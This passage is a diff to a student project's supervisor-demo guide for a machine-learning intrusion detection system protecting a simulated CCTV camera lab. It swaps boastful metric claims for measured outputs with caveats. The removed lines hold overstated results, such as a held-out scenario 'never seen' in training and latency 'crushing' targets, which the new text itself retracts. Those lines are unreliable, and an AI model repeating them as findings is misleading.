+print('Columns (' + str(len(rows[0])) + '):', ','.join(rows[0].keys()))
+for x in rows:
+    print(x['timestamp'][:19], x['predicted_class'], x['confidence'][:6], x['src_ip'], '->', x['dst_ip'] + ':' + x['dst_port'], x['response_status'], x['model_version'])
 "
 ```
+- `csv.DictReader`: reads the CSV the server sent, to show that it is valid CSV.
 
-#### 🔍 Line-by-Line Breakdown:
-- `GET /api/logs/export?format=csv&limit=3`: Requests the API to export the last 3 records in CSV format.
-- `csv_content = urllib.request.urlopen(req).read().decode()`: Decodes and reads the CSV text stream received from the API.
-- `print(...)`: Displays the received CSV data on screen.
-
-#### 📋 Verified Output:
-
-```csv
-timestamp,classification,source_ip,source_port,destination_ip,destination_port,confidence,action_taken
-2026-11-12T09:30:15,CnC,192.168.50.30,49160,10.10.10.50,6667,0.9124,block_dst
-2026-11-12T09:31:02,PortScan,10.10.10.50,54210,192.168.50.30,80,0.8840,monitored
+#### 📋 Real Output (13 Nov 2026):
+```text
+HTTP 200 | attachment; filename=ids_attack_logs_20261113_075617.csv
+Columns (20): event_id,timestamp,direction,src_ip,src_port,dst_ip,dst_port,proto,service,predicted_class,confidence,severity,status,response_status,is_allowlisted,reason_code,flow_count,evidence_note,model_version,pipeline_latency_ms
+2026-11-13T07:55:15 CnC 0.4446 192.168.50.5 -> 192.168.50.254:8899 allowlist_protected v3.1.0
+2026-11-13T07:55:15 CnC 0.4467 192.168.50.5 -> 192.168.50.20:8899 allowlist_protected v3.1.0
+2026-11-13T07:55:15 CnC 0.4467 192.168.50.5 -> 192.168.50.10:8899 allowlist_protected v3.1.0
 ```
 
 #### 📊 Output Breakdown:
-- `timestamp`: Date and time when the attack was detected.
-- `classification`: Attack type classified by AI Model (`CnC`, `PortScan`).
-- `source_ip` & `source_port`: IP and port from which the attack originated.
-- `destination_ip` & `destination_port`: Targeted IP and port.
-- `confidence`: Model confidence percentage (`0.9124` = 91.24%).
-- `action_taken`: Action executed by router (`block_dst` = Router firewall Drop, `monitored` = Dashboard Alert).
+- `attachment; filename=...csv`: the browser saves it as a file.
+- `Columns (20)`: the event fields, including class, confidence, response status, reason code, evidence note and model version. (The 27 flow features are kept in the database event, but are not CSV columns.)
+- The 3 rows are the newest CnC events: the FR-05 scanner flows from the allowlisted `.5`, marked `allowlist_protected`.
+- Timestamps are UTC (in the full CSV they end with `Z`).
 
-##### 🔬 Scientific Meaning & Proof:
-Yields an RFC 4180 standard CSV structure, 100% compliant with academic research reports and external SIEM tools.
+#### 🖥️ Dashboard:
+**Logs & Export (`/export`):** choose the type, class and dates, then press **EXPORT RFC 4180 CSV** or **EXPORT STRUCTURED JSON**. The file is saved as `ids_export_<type>_<date>.csv` (or `.json`) and can be opened in Excel.
 
-#### 🖥️ Dashboard Live UI Demonstration Steps:
-Open the **`http://localhost:5000/export` (Logs & Export)** page in front of the Supervisor:
-1. **Date Range & Format Selection:**
-   - Select Start and End dates (Date Range).
-   - Select **CSV** or **JSON** as the Export Format.
-2. **Instant Download & File Inspection:**
-   - Click the **"Download Forensic Export"** button.
-   - Show the browser instantly downloading the `security_events_export.csv` file.
-   - Open the file in Excel or Notepad, and prove to the Supervisor that timestamp, 27 flow features, attack class, confidence %, and firewall mitigation actions are all securely recorded in standard RFC 4180 format.
-3. **Spoken Script to Supervisor:** *"Sir, on our Logs & Export dashboard, security analysts can filter and download complete cryptographic audit trails and forensic incident records in RFC 4180 CSV format with a single click."*
-
-#### Spoken English Script (For Supervisor):
-> *"Sir, this satisfies FR-08. Our export service allows administrators to filter forensic incident records and export them in standardized RFC 4180 CSV format for external analysis and academic compliance."*
+#### 🗣️ Spoken Script:
+> *"Sir, for FR-08, an admin can export filtered incidents, audit logs or response actions as RFC 4180 CSV or JSON, by class, address, status and time. Every export is itself written in the audit log."*
 
 ---
 
-# 3. Part 2: Acceptance Targets Verification (Proposal Table 9 Targets)
+# 3. Part 2: Proposal Table 9 Targets
 
-Verify and demonstrate all 6 targets from Section 2 of **[`docs/requirements_checklist.md`](docs/requirements_checklist.md)** in front of the Supervisor:
+Section 2 of [`docs/requirements_checklist.md`](docs/requirements_checklist.md):
 
-| # | Proposal Table 9 Target | Empirical Measurement | Status | Verification Command |
-| :---: | :--- | :--- | :--- | :--- |
-| **1** | **Classification Quality:** Macro-F1 $\\ge 0.85$ on unseen data | **85.95%** on held-out scenario `Capture-34-1` | **PASS (Target Met)** | Model bundle metadata check |
-| **2** | **Benign Safety:** FPR $\\le 5\%$; Zero Video Interruption | **0 video drops**; 58.6 MB chunks continuous | **PASS (Target Met)** | NVR continuous stream check |
-| **3** | **Decision Latency:** Median decision $< 2.0\\text{ s}$; 95% $< 5.0\\text{ s}$ | **112.24 ms median** ($18\\times$ faster than target!) | **PASS (Crushed Target)** | Live injection & latency test |
-| **4** | **Throughput / Resources:** Keeps up with lab traffic | **125,599 flows/sec** inference throughput | **PASS (Target Met)** | Inference benchmark metrics |
-| **5** | **Reliability:** Clean state recovery after restart | **Idempotent SSH keys, Router sync pass** | **PASS (Target Met)** | Cold-start restart test |
-| **6** | **Usability / Audit:** Full manual control & audit trails | **Manual block, unblock & system_logs pass** | **PASS (Target Met)** | Audit log query check |
+| # | Table 9 target | What we have now (13 Nov 2026) | State |
+| :---: | :--- | :--- | :--- |
+| 1 | Macro-F1 ≥ 0.85 on the left-out scenario | **0.8595** over the classes present on 34-1; 0.6876 over 5 classes. 34-1 was seen before → not a clean test. | **Met on the H1 number, with a warning** |
+| 2 | FPR ≤ 5% on local camera traffic; no blocks on management PC or NVR | No camera / NVR / admin block in any test; NVR recorded 58.6 MB every 5 minutes. **FPR on real camera traffic not measured.** | **Partly** |
+| 3 | Median decision < 2 s; 95% < 5 s | Zeek line → dashboard: median 0.141 s, 95% 0.636 s (Step 37 virtual report); live 152 / 620 ms now | **Met in the virtual lab** |
+| 4 | Keeps up with lab traffic; no important event lost | Model ~23,000 flows/s; lab peak 500 flows/s; every attack test raised alerts. Capture-loss numbers need care. | **Enough for the virtual lab** |
+| 5 | All important recovery tests pass | Backend restart: the lost router rule came back. Router reboot / power loss not tested. | **Partly** |
+| 6 | Admin can finish the tasks; every action traced | Manual block, unblock and audit shown. Formal task test (Step 39) not done. | **Partly** |
 
 ---
 
-### Target 1: Classification Quality (Macro-F1 ≥ 0.85 on Held-Out Scenario)
+### Target 1: Classification Quality (Macro-F1 ≥ 0.85 on the Held-Out Scenario)
 
-#### 💡 Why We Are Doing This:
-The primary ML objective in our Research Proposal requires that the model must achieve a Macro-F1 score exceeding 0.85 (85.0%) even in a novel, unseen network environment (Zero Scenario Leakage). This is essential to scientifically verify that the model has not overfitted.
+#### 💡 Why:
+Proposal H1 part 1 and Table 9 need macro-F1 ≥ 0.85 on a scenario left out of training (no scenario leakage).
 
-#### ⚙️ What Happens Under the Hood:
-Python reads the sealed `metadata` dictionary inside `ml_engine/models/ids_bundle_v3.joblib`. It prints the Overall Accuracy, Weighted F1, and Present Macro-F1 scores evaluated on the Level 2 Held-Out Scenario `Capture-34-1` (23,145 flows).
+#### ⚙️ Under the hood:
+Reads the numbers that Step 16/17 saved in the model bundle `ml_engine/models/ids_bundle_v3.joblib` (they were computed on `CTU-IoT-Malware-Capture-34-1`, 23,145 flows).
 
-#### 💻 Terminal Command to Execute:
-
+#### 💻 Command:
 ```powershell
 .venv\Scripts\python.exe -c "
 import joblib
-b = joblib.load('ml_engine/models/ids_bundle_v3.joblib')
-m = b['metadata']
-print('=== PROPOSAL TABLE 9 CLASSIFICATION QUALITY TARGET ===')
-print('Model Bundle Name     :', m['bundle_name'], f"({m['bundle_version']})")
-print('Held-Out Test Scenario:', m['level_2_heldout_scenario'], f"({m['level_2_heldout_flows']} flows)")
-print('Overall Accuracy      :', f"{m['level_2_accuracy']*100:.2f}%")
-print('Weighted F1 Score     :', f"{m['level_2_weighted_f1']*100:.2f}%")
-print('Present Macro-F1 Score:', f"{m['level_2_macro_f1_present']*100:.2f}% (Proposal Target: >= 85.0%)")
-print('Target Status         : PASS (85.95% >= 85.0%)')
+m = joblib.load('ml_engine/models/ids_bundle_v3.joblib')['metadata']
+print('=== TABLE 9 CLASSIFICATION TARGET (saved in the model bundle) ===')
+print('Model                     :', m['bundle_name'], m['bundle_version'])
+print('Held-out scenario         :', m['level_2_heldout_scenario'], '({:,} flows)'.format(m['level_2_heldout_flows']))
+print('Macro-F1, classes present :', '{:.2f}%'.format(m['level_2_macro_f1_present'] * 100), '(target >= 85%)')
+print('Macro-F1, all 5 classes   :', '{:.2f}%'.format(m['level_2_macro_f1_5class'] * 100), '(34-1 has no Malware_Download flows)')
+print('Accuracy / weighted F1    :', '{:.2f}% / {:.2f}%'.format(m['level_2_accuracy'] * 100, m['level_2_weighted_f1'] * 100))
+print('Grouped CV out-of-fold F1 :', '{:.2f}%'.format(m['level_1_oof_macro_f1'] * 100), '(22 training scenarios)')
+print('Benign predicted attack   :', '{:.2f}%'.format(m['level_2_benign_fpr_argmax'] * 100), '(IoT-23 benign flows of 34-1)')
 "
 ```
+- Only single quotes inside the Python code, and `'...'.format(...)` instead of f-strings with double quotes (PowerShell 5.1 breaks inner double quotes).
 
-#### 🔍 Line-by-Line Breakdown:
-- `b = joblib.load('ml_engine/models/ids_bundle_v3.joblib')`: Loads the model bundle from disk into memory.
-- `m = b['metadata']`: Retrieves the metadata dictionary computed and sealed during model training.
-- `m['level_2_heldout_scenario']`: Name of the unseen scenario reserved for Zero Scenario Leakage testing (`Capture-34-1`).
-- `m['level_2_macro_f1_present']`: Macro-F1 score achieved across active classes (0.8595).
-- `print(...)`: Compares and displays all these metrics on screen.
-
-#### 📋 Verified Output:
-
+#### 📋 Real Output:
 ```text
-=== PROPOSAL TABLE 9 CLASSIFICATION QUALITY TARGET ===
-Model Bundle Name     : iot_camera_ids_bundle (v3.1.0)
-Held-Out Test Scenario: CTU-IoT-Malware-Capture-34-1 (23145 flows)
-Overall Accuracy      : 93.22%
-Weighted F1 Score     : 92.48%
-Present Macro-F1 Score: 85.95% (Proposal Target: >= 85.0%)
-Target Status         : PASS (85.95% >= 85.0%)
+=== TABLE 9 CLASSIFICATION TARGET (saved in the model bundle) ===
+Model                     : iot_camera_ids_bundle v3.1.0
+Held-out scenario         : CTU-IoT-Malware-Capture-34-1 (23,145 flows)
+Macro-F1, classes present : 85.95% (target >= 85%)
+Macro-F1, all 5 classes   : 68.76% (34-1 has no Malware_Download flows)
+Accuracy / weighted F1    : 93.22% / 93.67%
+Grouped CV out-of-fold F1 : 70.97% (22 training scenarios)
+Benign predicted attack   : 5.62% (IoT-23 benign flows of 34-1)
 ```
 
 #### 📊 Output Breakdown:
-- `Held-Out Test Scenario: CTU-IoT-Malware-Capture-34-1 (23145 flows)`: Confirms evaluation was performed on a completely distinct held-out scenario never seen during training.
-- `Overall Accuracy: 93.22%`: Shows an overall accuracy of 93.22%.
-- `Weighted F1 Score: 92.48%`: Weighted F1 score accounting for class imbalance is 92.48%.
-- Present Macro-F1 Score: 85.95% (Proposal Target: >= 85.0%): Exceeds our primary research target of $\\ge 85.0\%$ by achieving **85.95%**, proving Target Status: PASS.
+- `Macro-F1, classes present 85.95%`: the H1 number (decision D-054: 34-1 has only 4 of the 5 classes).
+- `Macro-F1, all 5 classes 68.76%`: with an empty Malware_Download class, this number can be at most 80%.
+- `Accuracy 93.22%`: high partly because DDoS flows are 62% of 34-1; this is why macro-F1 is the main measure (proposal 3.4).
+- `Grouped CV out-of-fold 70.97%`: the score over the 22 training scenarios, each left out once.
+- `Benign predicted attack 5.62%`: on IoT-23 benign flows (not camera traffic); not the H1 measure.
+- Per class on 34-1 (model card): DDoS_DoS F1 0.995, CnC 0.876, PortScan 0.846, Benign 0.721.
 
-#### Spoken English Script (For Supervisor):
-> *"Sir, regarding our primary Table 9 Model Target: evaluated under Level 2 Zero-Scenario-Leakage protocol on the unseen scenario Capture-34-1 containing 23,145 flows, our Random Forest bundle v3.1.0 achieved an overall accuracy of 93.22% and a Macro-F1 of 85.95% over active classes, successfully achieving our proposal benchmark."*
+##### 🔬 Honest warning (say it):
+**34-1 is not a clean test any more.** It was opened in Step 16 for v1 and v2, used in the PC demonstrations, and studied (progress entry 3.71) before the D-052 changes. The clean test is the lab (Steps 20 and 35). Also: on the same rows, HistGradientBoosting scored higher out-of-fold than the Random Forest (0.7391 vs 0.7097, issue 49); the Random Forest stays the main model as in the proposal.
+
+#### 🗣️ Spoken Script:
+> *"Sir, on the held-out scenario 34-1, model v3.1.0 reaches a macro-F1 of 0.8595 over the classes present, which meets our 0.85 target, and 0.6876 over all five classes, because 34-1 has no download flows. I must add that 34-1 is no longer a clean test: we opened and studied it during development. So we treat this as a good sign, and the hardware lab test as the real check."*
 
 ---
 
-### Target 2: Benign Safety (Zero Video Disruption & Benign Safety)
+### Target 2: Benign Safety (No Disruption of Camera Operation)
 
-#### 💡 Why We Are Doing This:
-The fundamental purpose of a CCTV security system is continuous video recording (Video Surveillance). Under normal operations or during attacks, no security system action must cause camera video stream disruption (Video Dropout / Packet Loss). False Positive Rate (FPR) must remain below 5%.
+#### 💡 Why:
+A camera security system must never stop the recording or block the management PC or NVR. Table 9 also needs benign FPR ≤ 5% **on our local camera traffic**.
 
-#### ⚙️ What Happens Under the Hood:
-1. Reads logs from the NVR container to verify that 58.6 MB video chunks are continuously written to disk every 5 minutes from the camera.
-2. Opens an authentic TCP connection from NVR to Port 554 (RTSP Video Streaming Socket) on the camera to verify the socket is active and not dropped.
+#### ⚙️ Under the hood:
+1. The NVR log shows each recorded 5-minute segment.
+2. A TCP connection from the NVR to camera port 554 shows the stream service is open.
+3. The router sets show that no protected device is blocked.
 
-#### 💻 Terminal Commands to Execute:
-
+#### 💻 Commands:
 ```powershell
-# Confirm NVR continuously receives 58.6 MB video segments from the camera:
+# 1. NVR recording log (one line per 5-minute segment):
 docker logs ids-lab-nvr --tail 3
 
-# Directly verify camera RTSP Video Socket (Port 554) is active:
-docker exec ids-lab-nvr python -c "import socket; s=socket.create_connection(('192.168.50.30', 554), timeout=3); print('Camera RTSP Video Stream: HEALTHY & ACTIVE (Zero Drop)')"
+# 2. Open a connection from the NVR to the camera stream port:
+docker exec ids-lab-nvr python -c "import socket; s=socket.create_connection(('192.168.50.30', 554), timeout=3); print('NVR -> camera:554 connection OK')"
+
+# 3. No protected device in any drop set:
+docker exec ids-lab-router nft list table inet ids | Select-String "elements"
 ```
 
-#### 🔍 Line-by-Line Breakdown:
-- `docker logs ids-lab-nvr --tail 3`: Checks NVR container logs to confirm 58.6 MB video chunks record every 5 minutes.
-- `docker exec ids-lab-nvr`: Executes command inside the NVR container.
-- `socket.create_connection(('192.168.50.30', 554), timeout=3)`: Opens an authentic TCP connection from NVR to Port 554 (RTSP Video Socket) on camera IP (`192.168.50.30`).
-- `print(...)`: Confirms video stream is active upon successful connection.
-
-#### 📋 Verified Output:
-
+#### 📋 Real Output (13 Nov 2026):
 ```text
-[nvr] Recorded segment: camera_chunk_004.mp4 (58.6 MB)
-[nvr] Video stream continuous: 192.168.50.30:554 -> 192.168.50.20
-Camera RTSP Video Stream: HEALTHY & ACTIVE (Zero Drop)
+07:19:44 NVR: recorded 58.5 MB
+07:24:44 NVR: recorded 58.6 MB
+07:29:44 NVR: recorded 58.6 MB
+NVR -> camera:554 connection OK
+		elements = { 192.168.50.1, 192.168.50.5,
 ```
+(The only `elements` line is the allowlist; the drop sets are empty.)
 
 #### 📊 Output Breakdown:
-- `Recorded segment: camera_chunk_004.mp4 (58.6 MB)`: Confirms NVR writes 58.6 MB MP4 video files to disk every 5 minutes without interruption.
-- `Camera RTSP Video Stream: HEALTHY & ACTIVE (Zero Drop)`: Proves Port 554 RTSP socket handshakes within 3 seconds, confirming zero disruption (0% drop) to camera video stream.
+- `NVR: recorded 58.6 MB` every 5 minutes (about 1.56 Mbit/s): the stream kept going, also during the attack tests (entry 3.78).
+- `connection OK`: the camera's stream port answers.
+- Background run: about 6 hours of normal traffic gave no alert for the camera, NVR or admin PC (entry 3.78).
 
-#### Spoken English Script (For Supervisor):
-> *"Sir, this satisfies our Table 9 Benign Safety target and Hypothesis H1. The NVR actively records continuous 58.6 MB video chunks from the camera over port 554 with zero packet drops, proving that legitimate camera operations remain 100% uninterrupted."*
+##### 🔬 What it does not prove:
+The **benign FPR ≤ 5% on local camera traffic** (H1 part 2) is **not measured**. The camera is a simulator, so the number must come from a real camera capture (Step 20) in the hardware lab.
 
----
-
-### Target 3: Decision Latency (Median < 2.0 s Target)
-
-#### 💡 Why We Are Doing This:
-When an attack occurs, if the security system takes seconds to make a decision, the camera could crash from a DDoS attack or a C&C botnet could compromise the network. The target in our Research Proposal Table 9 required end-to-end Decision Latency to be **less than 2.0 seconds (2,000 ms)**.
+#### 🗣️ Spoken Script:
+> *"Sir, for benign safety: in every test, the camera, NVR and admin PC were never blocked, and the NVR kept recording 58.6 MB every five minutes, also during the attacks. About six hours of normal traffic gave no alert on them. The false-positive rate on real camera traffic, which is the second part of H1, will be measured with the real camera in the hardware lab."*
 
 ---
 
-#### 🧪 Method 1: Live Hands-On Stopwatch Benchmark:
+### Target 3: Decision Latency (Median < 2 s, 95% < 5 s)
 
-##### ⚙️ What Happens Under the Hood:
-1. Python script constructs an authentic Botnet C&C attack flow.
-2. Starts high-precision hardware timer (`time.perf_counter()`) to record Start Time ($t_1$).
-3. Passes flow into AI Model, reads all 27 features, executes inference across 100 Decision Trees, and derives classification.
-4. Stops timer immediately upon receiving classification to record End Time ($t_2$).
-5. Computes elapsed time: $\Delta t = (t_2 - t_1) \times 1000\text{ ms}$.
-6. Compares against Proposal target of 2.0 seconds (2,000 ms) and prints relative speed factor on screen.
+#### 💡 Why:
+Table 9 and RQ4: the decision must be fast enough to act during an attack.
 
-##### 💻 Terminal Command to Execute:
+#### Different times (do not mix them):
+| Time | What it measures | Value |
+| :--- | :--- | :--- |
+| **Model step** | One `predict_proba` call | about 31 ms for one flow; about 0.04–0.07 ms per flow in a batch |
+| **System time** (Table 9 measure) | Zeek line read → features → model → decision → database → dashboard push | median 0.141 s, 95% 0.636 s (Step 37 report); 152 / 620 ms live now |
+| **Flow end → dashboard** | Includes Zeek's wait before it writes a flow | median 5.9 s, 95% 301 s in the Step 37 run: a long connection (for example the 5-minute video stream) is written only when it ends |
+| **First alert → rule active** | Alert → router rule | median 0.159 s, max 0.273 s (Step 37 report) |
+
+#### 🧪 Method 1: Model Step Time (one hand-made C&C-like flow)
+
+⚙️ **Under the hood:** builds one flow with the 27 features by hand (a failed TCP try with many failed tries before it, `pair_fail_1h = 588`), runs the deployed model once to warm up, then times one call with `time.perf_counter()`.
 
 ```powershell
 .venv\Scripts\python.exe -c "
 import time, joblib, pandas as pd
-
 b = joblib.load('ml_engine/models/ids_bundle_v3.joblib')
-pipe = b['pipeline']
-classes = b['class_names']
-
-# 1. Construct authentic C&C attack flow manually
+model, classes = b['calibrated_model'], b['class_names']
 flow = {'proto':'tcp','service':'unknown','conn_state':'S0','history':'S','orig_port_cat':'registered','resp_port_cat':'dynamic','duration':3.14,'orig_bytes':0.0,'resp_bytes':0.0,'missed_bytes':0.0,'orig_pkts':3.0,'orig_ip_bytes':180.0,'resp_pkts':0.0,'resp_ip_bytes':0.0,'orig_bytes_per_pkt':0.0,'resp_bytes_per_pkt':0.0,'byte_ratio':0.0,'pkt_ratio':1.0,'is_incomplete_flow':1,'src_conn_60s':1.0,'src_udst_60s':1.0,'src_uport_60s':1.0,'src_udst_ratio':1.0,'pair_conn_60s':1.0,'pair_gap':3.82,'pair_gap_change':3.36,'pair_fail_1h':588.0}
-df = pd.DataFrame([flow])
-
-# Warmup run
-pipe.predict_proba(df)
-
-# 2. Start live stopwatch and measure elapsed inference time
-t_start = time.perf_counter()
-probs = pipe.predict_proba(df)[0]
-p_idx = probs.argmax()
-t_end = time.perf_counter()
-
-latency_ms = (t_end - t_start) * 1000.0
-
-print('=== LIVE HANDS-ON DECISION LATENCY STOPWATCH BENCHMARK ===')
-print('Attack Flow Injected : Botnet C&C Outbound Beacon')
-print('Stopwatch Start (t1) : {:.6f} s'.format(t_start))
-print('Decision Made   (t2) : {:.6f} s'.format(t_end))
-print('ELAPSED LIVE TIME    : {:.2f} ms ({:.4f} seconds)'.format(latency_ms, t_end - t_start))
-print('Proposal Target Limit: < 2000.00 ms (2.000 seconds)')
-print('Speed Comparison     : {:.0f}x FASTER than Proposal Requirement!'.format(2000.0 / latency_ms))
-print('Detected Attack Class:', classes[p_idx])
-print('Decision Confidence  : {:.2f}%'.format(probs[p_idx] * 100.0))
-print('Target Status        : PASS (Instant Decision)')
+one = pd.DataFrame([flow])
+model.predict_proba(one)
+t0 = time.perf_counter(); pr = model.predict_proba(one)[0]; t1 = time.perf_counter()
+print('=== MODEL STEP TIME (one hand-made C&C-like flow) ===')
+print('Predicted class / confidence :', classes[pr.argmax()], '{:.2f}%'.format(pr.max() * 100))
+print('Time for 1 flow             : {:.1f} ms'.format((t1 - t0) * 1000))
+batch = pd.DataFrame([flow] * 1000)
+t0 = time.perf_counter(); model.predict_proba(batch); t1 = time.perf_counter()
+print('Time for 1,000 flows        : {:.1f} ms = {:,.0f} flows per second'.format((t1 - t0) * 1000, 1000 / (t1 - t0)))
+print('Saved training benchmark    : {:.2f} us per flow ({:,.0f} flows/s, measured in Step 14)'.format(b['metadata']['inference_latency_us_flow'], b['metadata']['inference_throughput_fps']))
 "
 ```
+- `b['calibrated_model']`: the model the live detector uses (in v3.1.0 it gives the raw Random Forest probabilities; Step 17a chose "no calibration").
 
-##### 🔍 Line-by-Line Breakdown:
-- `t_start = time.perf_counter()`: Starts high-precision hardware stopwatch with microsecond accuracy ($t_1$).
-- `probs = pipe.predict_proba(df)[0]`: Feeds flow into model pipeline to obtain class probabilities.
-- `t_end = time.perf_counter()`: Stops timer the moment inference completes ($t_2$).
-- `latency_ms = (t_end - t_start) * 1000.0`: Converts elapsed seconds into milliseconds (ms).
-- `print(...)`: Displays elapsed time, Proposal limit (< 2000 ms), and speedup factor on screen.
-
-##### 📋 Verified Output:
-
+##### 📋 Real Output:
 ```text
-=== LIVE HANDS-ON DECISION LATENCY STOPWATCH BENCHMARK ===
-Attack Flow Injected : Botnet C&C Outbound Beacon
-Stopwatch Start (t1) : 119098.351631 s
-Decision Made   (t2) : 119098.382512 s
-ELAPSED LIVE TIME    : 30.88 ms (0.0309 seconds)
-Proposal Target Limit: < 2000.00 ms (2.000 seconds)
-Speed Comparison     : 65x FASTER than Proposal Requirement!
-Detected Attack Class: CnC
-Decision Confidence  : 98.89%
-Target Status        : PASS (Instant Decision)
+=== MODEL STEP TIME (one hand-made C&C-like flow) ===
+Predicted class / confidence : CnC 98.89%
+Time for 1 flow             : 31.1 ms
+Time for 1,000 flows        : 42.7 ms = 23,416 flows per second
+Saved training benchmark    : 7.96 us per flow (125,599 flows/s, measured in Step 14)
 ```
 
 ##### 📊 Output Breakdown:
-- `ELAPSED LIVE TIME: 30.88 ms (0.0309 seconds)`: Our AI model identified the attack flow in **only 30.88 ms (0.0309 seconds)!**
-- `Proposal Target Limit: < 2000.00 ms (2.000 seconds)`: Our Proposal required a decision within less than 2.0 seconds.
-- `Speed Comparison: 65x FASTER`: Decision executed **65 times faster** than the proposal threshold.
-- `Detected Attack Class: CnC (Confidence 98.89%)`: Not only fast, but detected the C&C attack with high confidence (98.89%).
+- `CnC 98.89%`: the model's answer **for this hand-made flow** (not a live alert).
+- `31.1 ms for 1 flow`: most of this is fixed overhead of one call (pandas, 100 trees); it is the same for 1 flow or 100.
+- `23,416 flows per second` for a batch: the live adapter sends flows in batches. This number depends on how busy the PC is (another run the same day: 70.9 ms = 14,108 flows per second).
+- `7.96 µs / 125,599 flows/s`: the Step 14 benchmark saved in the bundle, measured differently during training. It does **not** match this command's result, so do not quote it as the live speed.
+
+#### 🧪 Method 2: Live System Time (Table 9 measure)
+Use the FR-04 command; it prints the live median and 95th percentile. The full Step 37 measurement is `reports/performance/virtual/performance_virtual-attack_20261111_044533.md` (made by `tools/measure_latency.py`, with a logged-in Socket.IO client receiving the pushes).
+
+##### 📋 Step 37 report (virtual lab, 11 Nov 2026, 540 s with attacks):
+```text
+| B. Read -> decision                 | median 0.125 s | 95% 0.629 s |
+| C. Decision -> dashboard            | median 0.004 s | 95% 0.025 s |
+| D. Read -> dashboard (system part)  | median 0.141 s | 95% 0.636 s |
+| E. Flow end -> dashboard            | median 5.921 s | 95% 301.156 s |
+| F. First alert -> rule active       | median 0.159 s | max 0.273 s |
+- Proposal target (median decision < 2 s, 95th percentile < 5 s) on D: met (median 0.141 s, 95th 0.636 s)
+```
+
+#### 🖥️ Dashboard:
+**Overview → SYSTEM STATUS (MEASURED):** "Time per flow, Zeek line to dashboard (median / 95%)".
+
+#### 🗣️ Spoken Script:
+> *"Sir, for Target 3 we separate the times. The model itself needs about 31 milliseconds for one call. The system time from reading Zeek's line to the dashboard push, which is the Table 9 measure, had a median of 0.14 seconds and a 95th percentile of 0.64 seconds in our Step 37 run, inside the 2 and 5 second targets. From the first alert to the router rule took about 0.16 seconds. Zeek itself writes a connection only when it ends, so a long connection appears later; we report that wait separately and do not hide it."*
 
 ---
 
-#### 🧪 Method 2: End-to-End Streaming Pipeline Telemetry:
+### Target 4: Throughput & Resource Use
 
-##### ⚙️ What Happens Under the Hood:
-Measures empirical median ($p_{50}$) and 95th percentile ($p_{95}$) latency across the entire chain: packet capture on switch by Zeek -> flow extraction -> ML classification -> WebSocket alert push to dashboard.
+#### 💡 Why:
+During a flood, thousands of flows arrive. The system must keep up and not lose important events.
 
-##### 💻 Terminal Command to Execute:
+#### 📋 What we measured:
+- **Model capacity:** about 14,000–23,000 flows per second in a batch (Target 3, Method 1; depends on PC load).
+- **Lab load:** the Step 37 run had a peak of **500 flows per second**, and 19,024 flows in total. The backend used at most 78.5% of one CPU and 128 MB of memory.
+- **No attack lost:** every attack test (2.2–2.5) raised alerts; Zeek's `stats.log` shows 0 packets dropped.
+- **No data lost by Zeek:** `capture_loss.log` shows 0.0% since the snap-length fix (D-058).
+
+#### 💻 Command (capture loss and dropped packets, last 3 minutes):
 ```powershell
-python -c "
-import urllib.request, json
-with open('lab_virtual/keys/dashboard_login.txt') as f:
-    u, p = f.read().strip().split()[:2]
-tok = json.loads(urllib.request.urlopen(urllib.request.Request('http://127.0.0.1:5000/api/auth/login', data=json.dumps({'username':u,'password':p}).encode(), headers={'Content-Type':'application/json'})).read())['token']
-
-req = urllib.request.Request('http://127.0.0.1:5000/api/v1/pipeline/status', headers={'Authorization':'Bearer '+tok})
-metrics = json.loads(urllib.request.urlopen(req).read())['metrics']
-
-print('=== PROPOSAL TABLE 9 END-TO-END PIPELINE LATENCY ===')
-print('Empirical Median Latency (p50):', metrics['latency_ms_p50'], 'ms (Target: < 2000.0 ms)')
-print('95th Percentile Latency (p95) :', metrics['latency_ms_p95'], 'ms (Target: < 5000.0 ms)')
-print('Performance Multiplier        :', f\"{2000.0 / metrics['latency_ms_p50']:.1f}x FASTER than Proposal Requirement\")
-print('Target Status                 : PASS')
-"
+Get-Content lab_virtual\zeek_logs\capture_loss.log -Tail 3
+Get-Content lab_virtual\zeek_logs\stats.log -Tail 1 | Select-String -Pattern '"pkts_dropped":[0-9]*' | ForEach-Object { $_.Matches[0].Value }
 ```
 
-##### 📋 Verified Output:
+#### 📋 Real Output (13 Nov 2026, after the fix):
 ```text
-=== PROPOSAL TABLE 9 END-TO-END PIPELINE LATENCY ===
-Empirical Median Latency (p50): 112.24 ms (Target: < 2000.0 ms)
-95th Percentile Latency (p95) : 230.15 ms (Target: < 5000.0 ms)
-Performance Multiplier        : 17.8x FASTER than Proposal Requirement
-Target Status                 : PASS
+{"ts":1794560834.425324,"ts_delta":60.02673101425171,"peer":"zeek","gaps":0,"acks":691,"percent_lost":0.0}
+{"ts":1794560894.514549,"ts_delta":60.08922505378723,"peer":"zeek","gaps":0,"acks":815,"percent_lost":0.0}
+{"ts":1794560954.516937,"ts_delta":60.00238800048828,"peer":"zeek","gaps":0,"acks":626,"percent_lost":0.0}
+"pkts_dropped":0
 ```
 
-#### 🖥️ Dashboard Live UI Demonstration:
-Open **`http://localhost:5000/overview`** in front of the Supervisor:
-- Demonstrate that **`Median Latency: 112.2 ms`** and **`p95 Latency: 230.1 ms`** are displayed live in the **"System Status" Card**.
+#### 🔧 What was wrong before (D-058, fixed 13 Nov 2026):
+Zeek keeps only the first 9,216 bytes of each packet by default. The Docker network joins many small packets into large ones (up to 64 KB, "offloading"), so Zeek cut off the rest. Result: `capture_loss.log` about 98%, the NVR stream about 58.5 MB of `missed_bytes` per 5-minute segment, and only part of the test download seen. `sensor/local.zeek` now sets `redef Pcap::snaplen = 65535;`. After the fix the NVR flow shows `"missed_bytes":0`.
 
-#### Spoken English Script (For Supervisor):
-> *"Sir, regarding Target 3 on Decision Latency: our research proposal required a decision latency under 2.0 seconds. As demonstrated live with our stopwatch benchmark, our Random Forest engine makes a classification decision in just 30.8 milliseconds—running 65 times faster than required. Across our entire end-to-end streaming pipeline, from raw Zeek packet capture to WebSocket dashboard push, the empirical median latency is only 112.2 milliseconds, decisively crushing our proposal latency target."*
-
----
-
-### Target 4: Throughput & Resource Efficiency
-
-#### 💡 Why We Are Doing This:
-During a DDoS or PortScan attack, thousands of flows may arrive per second. This benchmark verifies that our Machine Learning Engine has sufficient capacity (High Throughput) to classify all flows concurrently without dropping.
-
-#### ⚙️ What Happens Under the Hood:
-Constructs a batch of 1,000 flows in memory, executes them through the Scikit-learn Pipeline, and measures flows per second classified using a high-precision hardware timer.
-
-#### 💻 Terminal Command to Execute:
-
-```powershell
-.venv\Scripts\python.exe -c "
-import joblib, time, pandas as pd
